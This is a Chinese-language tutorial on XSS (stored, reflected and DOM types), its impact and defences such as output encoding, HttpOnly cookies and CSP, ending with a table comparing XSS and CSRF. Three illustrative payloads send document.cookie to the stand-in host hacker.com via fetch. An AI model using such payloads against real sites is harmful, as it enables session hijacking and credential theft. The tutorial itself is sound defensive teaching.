XSS 和 CSRF 是 Web 领域最经典、最常见的两大前端安全漏洞，二者均利用 Web 系统的信任机制实施攻击，但核心原理、攻击方式、危害范围和防御方案完全不同。下面我们从基础定义、攻击原理、分类、危害、防御方案等维度，逐一拆解讲解，并明确二者的核心区别。

## XSS（Cross-Site Scripting，跨站脚本攻击）

### 1. 核心定义与原理

XSS 全称跨站脚本攻击（缩写为 XSS 而非 CSS，是为了避免与层叠样式表 CSS 重名），**核心原理是：攻击者向 Web 页面注入恶意 JavaScript 脚本，当用户浏览该页面时，恶意脚本会在用户的浏览器中自动执行，从而劫持用户会话、窃取敏感信息、篡改页面内容、实施钓鱼攻击等**。

XSS 攻击的本质，是利用了**网站对用户输入内容的信任**—— 网站未经安全处理，就把用户可控的内容渲染到页面中，导致浏览器把恶意内容当成合法脚本解析执行。

### 2. XSS 的三大核心类型

根据攻击脚本的存储位置和触发方式，XSS 分为 3 种主流类型，其中存储型危害最大，DOM 型最容易被忽略。

#### （1）存储型 XSS（持久型 XSS）

存储型 XSS 是危害最严重的 XSS 类型，**恶意脚本会被永久存储到网站的后端数据库中，所有访问该页面的用户都会触发攻击**，无需攻击者单独诱导。
##### 攻击流程

1. 攻击者在网站的用户可输入区域（论坛评论区、留言板、个人简介、帖子内容、商品评价等），提交包含恶意 JS 脚本的内容；
2. 网站后端未对内容做过滤 / 转义，直接将恶意内容存入数据库；
3. 普通用户访问包含该内容的页面时，网站从数据库取出内容，直接渲染到 HTML 页面中返回给浏览器；
4. 用户的浏览器解析页面时，恶意脚本被自动执行，攻击完成。
##### 典型示例

攻击者在论坛评论区提交如下内容：

```html
<script>
// 恶意脚本：把用户的登录Cookie发送到攻击者的服务器
fetch('https://hacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

如果网站未做安全处理，所有查看这条评论的用户，都会执行该脚本，自己的登录凭证会被攻击者窃取。
##### 常见场景

UGC 平台、论坛社区、社交网站、电商评论区、博客留言板等支持用户发布内容并公开渲染的场景。

#### （2）反射型 XSS（非持久型 XSS）

反射型 XSS 是最常见的 XSS 类型，**恶意脚本不会存入数据库，仅存在于单次请求中，需要攻击者诱导用户点击恶意链接才能触发**。
##### 攻击流程

1. 攻击者构造包含恶意脚本的 URL，例如：
    
```plaintext
    https://target.com/search?keyword=<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>
```
    
2. 攻击者通过私信、邮件、社交平台等渠道，诱导用户点击该恶意 URL；
3. 用户点击后，网站后端从 URL 中取出 `keyword` 参数，未经转义直接渲染到页面的搜索结果中（例如页面显示 “您搜索的内容是：xxx”），随页面返回给浏览器；
4. 用户的浏览器解析页面时，恶意脚本被执行，攻击完成。
##### 核心特点

- 非持久化，脚本只在本次请求中生效，不会留存到网站；
- 必须诱导用户主动点击链接，才能触发攻击；
- 恶意内容完全依赖 URL 携带，容易被用户察觉，也容易被 WAF 拦截。
##### 常见场景

网站搜索页、错误提示页、URL 参数回显页等直接把 URL 参数渲染到页面的场景。

#### （3）DOM 型 XSS

DOM 型 XSS 是一种特殊的 XSS 类型，**攻击全程不经过网站后端，完全在前端浏览器中，通过 JS 操作 DOM 触发**，传统的后端安全防护完全无效。
##### 攻击流程

1. 攻击者构造包含恶意脚本的 URL，例如：
    
```plaintext
    https://target.com/#username=<img src=x onerror="fetch('https://hacker.com/steal?cookie='+document.cookie)">
```

   （`#` 后的 hash 内容不会发送到后端，仅前端可读取）
2. 诱导用户点击该恶意 URL；
3. 网站前端的 JS 代码，未经安全处理，直接从 URL 中取出 hash 内容，通过 `innerHTML`、`document.write` 等 API 插入到页面 DOM 中；
4. 浏览器解析 DOM 时，恶意脚本被执行，攻击完成。
##### 核心特点

- 恶意内容不会发送到后端，后端的过滤、转义完全无效，只能由前端做防护；
- 触发依赖前端不安全的 DOM 操作，是单页应用（SPA）最常见的 XSS 漏洞。
##### 常见触发场景

前端代码中使用了以下不安全的 API，且传入了用户可控的内容：

- `innerHTML`、`outerHTML`、`document.write()`、`document.writeln()`
- `eval()`、`setTimeout("字符串代码")`、`setInterval("字符串代码")`、`new Function("代码")`
- 给 `a` 标签的 `href` 属性赋值 `javascript:` 伪协议
- 给 `img`、`svg` 等标签的 `onerror`、`onload` 事件赋值用户可控内容

### 3. XSS 的核心危害

XSS 漏洞的危害上限极高，恶意脚本在目标网站的源下执行，拥有和网站合法 JS 完全相同的权限，可实现以下攻击：

1. **窃取用户敏感信息**：最核心的危害，通过 `document.cookie` 窃取未设置 `HttpOnly` 的登录凭证（SessionID、Token），实现会话劫持，直接冒充用户登录账号；也可读取 `localStorage`、`sessionStorage` 中的用户隐私数据。
2. **页面篡改与钓鱼攻击**：篡改页面内容，伪造登录框、支付弹窗，诱导用户输入账号密码、银行卡信息；也可发布虚假公告、诈骗信息。
3. **劫持用户操作**：监听用户键盘输入（`keydown` 事件），记录账号密码、支付密码；自动执行用户权限内的操作，如发帖子、转账、关注攻击者、删除数据等。
4. **蠕虫式传播**：存储型 XSS 可实现蠕虫攻击，例如在社交网站中，恶意脚本自动给用户的好友发送带恶意链接的私信，几小时内即可扩散到数十万用户（典型案例：2011 年新浪微博 XSS 蠕虫事件）。
5. **其他恶意操作**：植入挖矿脚本，利用用户的 CPU/GPU 挖矿；以用户浏览器为跳板，扫描企业内网、攻击内网服务；弹出恶意广告、强制跳转色情 / 诈骗网站。

### 4. XSS 的完整防御方案

XSS 防御的核心原则是：**永远不要信任用户的任何输入，所有用户可控的内容，必须根据输出场景做对应的安全处理**。

#### （1）核心防御：输入过滤 + 输出编码

- **输入过滤（辅助手段）**：对用户提交的内容做格式校验和非法内容过滤，例如限制输入长度、校验格式、过滤危险标签和事件属性（`<script>`、`onerror`、`onload` 等）。注意：输入过滤只能作为辅助，无法作为核心防御 —— 攻击者有大量编码、变形的方式绕过过滤规则。
- **输出编码（根本防御）**：根据内容输出的上下文（HTML、JS、CSS、URL），对用户可控内容做对应的编码转义，让浏览器将其识别为纯文本，而非可执行的脚本。
    
    - 输出到 HTML 内容中：转义 HTML 特殊字符，`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;`、`'` → `&#39;`、`&` → `&amp;`；
    - 输出到 JS 代码中：做 Unicode 转义；
    - 输出到 URL 参数中：做 URL 编码（`encodeURIComponent`）。
#### （2）前端安全编码规范

- 禁止使用 `innerHTML`、`eval`、`document.write` 等危险 API 处理用户可控内容，优先使用 `innerText`、`textContent`（二者会将内容识别为纯文本，不会解析 HTML）；
- 若必须使用 `innerHTML`，需先通过成熟的转义库（如 `js-xss`）对内容做全量转义；
- 禁止给 `a` 标签的 `href` 赋值用户可控的内容，必须校验是否为合法的 `http/https` 协议，禁止 `javascript:` 伪协议。

#### （3）HttpOnly Cookie

给核心登录凭证（SessionID、登录 Token）的 Cookie 设置 `HttpOnly` 属性，设置后，JS 无法通过 `document.cookie` 读取到该 Cookie，即使存在 XSS 漏洞，也无法窃取核心登录凭证，大幅降低攻击危害。

> 补充：[HttpOnly、Secure](HttpOnly、Secure.md)

示例（HTTP 响应头）：

```plaintext
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

#### （4）CSP（内容安全策略，Content Security Policy）

CSP 是浏览器提供的**最强 XSS 兜底防御手段**，通过 HTTP 响应头或 HTML 的 `meta` 标签，定义白名单规则，告诉浏览器：

- 哪些域名的脚本 / 样式 / 图片可以加载；
- 是否允许执行内联脚本、`eval` 动态代码；
- 违规的脚本如何处理（拦截上报 / 仅上报）。

即使网站存在 XSS 漏洞，注入的恶意脚本不在白名单内，也会被浏览器直接拦截，无法执行。
##### 典型配置示例

```http
# HTTP 响应头：只允许加载本站资源，禁止内联脚本、禁止eval
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'
```

#### （5）其他辅助防御

- 部署 WAF（Web 应用防火墙），拦截常见的 XSS 攻击请求；
- 关键操作增加二次验证（短信验证码、原密码校验、人脸识别），即使账号被劫持，也无法完成高危操作；
- 定期做代码审计和漏洞扫描，提前发现 XSS 风险点。

## 三、XSS 与 CSRF 核心区别对比

| 对比维度         | XSS（跨站脚本攻击）                            | CSRF（跨站请求伪造）                         |
| :----------- | :------------------------------------- | :----------------------------------- |
| **核心原理**     | 注入恶意 JS 脚本，在受害者浏览器中执行，利用**网站对用户输入的信任** | 利用用户的登录状态，诱导发起伪造请求，利用**网站对用户浏览器的信任** |
| **攻击前提**     | 网站存在输入 / 输出漏洞，允许恶意脚本注入执行               | 用户已登录目标网站，浏览器保存了有效 Cookie            |
| **是否需要用户登录** | 不一定，非登录页面也可能存在 XSS 漏洞                  | 必须，只有登录后才能利用用户的权限执行操作                |
| **能否窃取用户信息** | 可以，能直接读取 Cookie、Token、用户输入的隐私数据        | 不能，全程无法获取用户的任何信息，仅能冒充用户发起请求          |
| **攻击载体**     | 恶意 JavaScript 脚本                       | 伪造的 HTTP 请求                          |
| **同源策略限制**   | 注入的脚本在目标网站的源下执行，不受同源策略限制               | 受同源策略限制，仅能发起请求，无法读取请求的响应内容           |
| **防御核心**     | 输出编码、CSP 内容安全策略、HttpOnly Cookie        | CSRF Token、Cookie SameSite 属性、同源检测   |

## 四、关键补充说明

1. **HTTPS 无法防御这两种漏洞**：HTTPS 仅加密了数据传输过程，防止中间人窃听和篡改，对 XSS 和 CSRF 没有任何防御效果，HTTPS 网站依然可能存在这两类严重漏洞。
2. **XSS 可完全绕过 CSRF 防御**：如果网站存在 XSS 漏洞，攻击者可通过恶意脚本直接读取页面中的 CSRF Token，构造合法请求，绕过所有 CSRF 防御措施，因此 XSS 的危害远大于 CSRF。
3. **防御需体系化**：无论是 XSS 还是 CSRF，都不能依赖单一的防御手段，需要从开发规范、编码处理、服务器配置、浏览器特性、兜底验证等多个维度，构建完整的防御体系。
